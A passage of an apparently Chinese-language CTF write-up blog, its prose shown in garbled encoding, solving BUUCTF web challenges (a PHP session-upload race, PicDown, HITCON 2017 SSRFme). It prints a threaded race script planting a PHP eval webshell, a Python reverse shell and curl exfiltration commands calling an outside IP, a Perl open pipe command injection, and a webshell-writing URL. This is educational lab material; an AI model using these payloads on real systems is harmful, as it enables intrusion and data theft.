</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span> <span class="s1">&#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php eval($_POST[&#34;cmd&#34;]);?&gt;&#39;</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span><span class="n">f</span><span class="p">)},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/?file=/tmp/sess_&#39;</span><span class="o">+</span><span class="n">sessid</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;1.txt&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+++++++++++++]retry&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¢„æœŸè§£æ˜¯è¦ç”¨åˆ°require_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«</p>
<p>[phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶][https://www.anquanke.com/post/id/213235]</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="nb">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„picdown">[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown
</h2><p>éé¢„æœŸ</p>
<p>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ç›´æ¥è¯»/flag</p>
<p>é¢„æœŸ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¯»å–
</span></span><span class="line"><span class="cl">/proc/self/environ
</span></span><span class="line"><span class="cl">/proc/self/cmdline    
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ‰ä¸ªapp.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SECRET_FILE</span> <span class="o">=</span> <span class="s2">&#34;/tmp/secret.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">SECRET_FILE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">SECRET_FILE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;search.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/page&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;url&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;application/octet-stream&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Disposition&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;attachment; filename=beautiful.jpg&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">response</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="s2">&#34;HACK ERROR!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="s2">&#34;SOMETHING WRONG!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;search.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/no_one_know_the_manager&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">manager</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;key&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">SECRET_KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="n">SECRET_KEY</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;shell&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;ok&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;Wrong Key!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åè¿™ä¸ªè·¯ç”±è¦æ±‚secretkey</p>
<p>æ³¨æ„å…³äº<code>SECRET_KEY</code>çš„é€»è¾‘ï¼Œè™½ç„¶è¯¥æ–‡ä»¶åœ¨æ‰“å¼€è¯»å–åè¢«åˆ é™¤äº†ï¼Œä½†æ˜¯æ³¨æ„è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰å…³é—­ï¼Œæ‰€ä»¥ä»ç„¶å¯ä»¥é€šè¿‡<code>/proc/self/fd/[num]</code>è®¿é—®å¯¹åº”æ–‡ä»¶ï¼ˆæ­¤å¤„[num]ä»£è¡¨ä¸€ä¸ªæœªçŸ¥çš„æ•°å€¼ï¼Œéœ€è¦ä»0å¼€å§‹éå†æ‰¾å‡ºï¼‰ï¼Œè¿™é‡Œåœ¨<code>/proc/self/fd/3</code>æ‰¾åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸‹é¢å°±æ˜¯å¼¹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvp 3333
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=python -c &#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;47.122.53.248&#39;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2247.122.53.248%22,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…curlæŠŠæ•°æ®å¤–å¸¦</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=curl 47.122.53.248:3333/`ls /|base64`
</span></span><span class="line"><span class="cl">?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=curl 47.122.53.248:3333/`cat /flag|base64`
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hitcon-2017ssrfme">[HITCON 2017]SSRFme
</h2><p>ä»£ç å®¡è®¡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$http_x_headers</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$http_x_headers</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s2">&#34;sandbox/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;orange&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;GET &#34;</span> <span class="o">.</span> <span class="nx">escapeshellarg</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;url&#34;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;filename&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dir</span>  <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">&#34;dirname&#34;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">&#34;basename&#34;</span><span class="p">]),</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>orange+ipçš„MD5å€¼å°±æ˜¯ç›®å½•ï¼Œç„¶åurlä¼ dataå€¼ç»™åé¢filenameå†™å…¥çš„æ–‡ä»¶</p>
<p>é¢˜ç›®å«ssrfmeï¼Œæˆ‘ä»¬å…ˆfile://è¯»ä¸€ä¸‹æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=file:///&amp;filename=123
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315131117847.png"
	width="1396"
	height="970"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315131117847_hu13224382346604119864.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250315131117847_hu2301384308013477548.png 1024w"
	loading="lazy"
	
		alt="image-20250315131117847"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="345px"
	
></p>
<p>è®¿é—®flagæ˜¯ç©ºçš„ï¼Œä¸‹é¢æœ‰ä¸ªreadflagæ˜¾ç„¶è¦ç”¨å‘½ä»¤æ‰§è¡Œreadflagæ‰è¡Œ</p>
<p>è¿™é‡Œæœ‰å‰ç½®çŸ¥è¯†ï¼Œåˆ©ç”¨perlè¯­è¨€çš„æ¼æ´ï¼šå› ä¸ºGETå‡½æ•°åœ¨åº•å±‚è°ƒç”¨äº†perlè¯­è¨€ä¸­çš„openå‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°å­˜åœ¨rceæ¼æ´ã€‚å½“openå‡½æ•°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å­˜åœ¨ç®¡é“ç¬¦ï¼ˆå¹¶ä¸”ç³»ç»Ÿä¸­å­˜åœ¨è¯¥æ–‡ä»¶åï¼‰ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œã€‚</p>
<p>å…ˆåˆ›å»ºæ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=&amp;filename=|/readflag
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæ‰§è¡Œå‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=file:|readflag&amp;filename=123
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯è¿™ä¸ªå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œç”¨bashå‘½ä»¤è¯•è¯•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=&amp;filename=|bash -c /readflag
</span></span><span class="line"><span class="cl">?url=file:|bash -c /readflag&amp;filename=123
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…ç›´æ¥å†™é©¬èšå‰‘è¿æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=data://text,plain,&#39;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#39;&amp;filename=shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315133249902.png"
	width="511"
	height="69"
